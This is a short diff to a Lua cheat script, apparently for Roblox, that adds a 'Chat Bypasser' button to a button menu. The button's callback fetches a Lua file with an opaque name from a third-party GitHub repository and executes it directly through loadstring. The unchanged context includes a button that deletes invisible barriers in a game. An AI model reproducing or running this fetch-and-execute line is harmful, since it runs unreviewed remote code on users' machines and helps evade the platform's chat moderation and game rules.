@@ -134,6 +134,10 @@ local function createButton(text, callback)
 end
  
 -- Example buttons (replace/add your own)
+createButton("Chat Bypasser", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/randomizedcomponent/UC/refs/heads/main/3307468c285f4fe535fb5d87b4b053e6.lua"))()
+end)
+
 createButton("Remove Invis Walls", function()
 	local targets = {"StageBlock", "NoCollidePart", "Barrier"}
 	for _, name in ipairs(targets) do
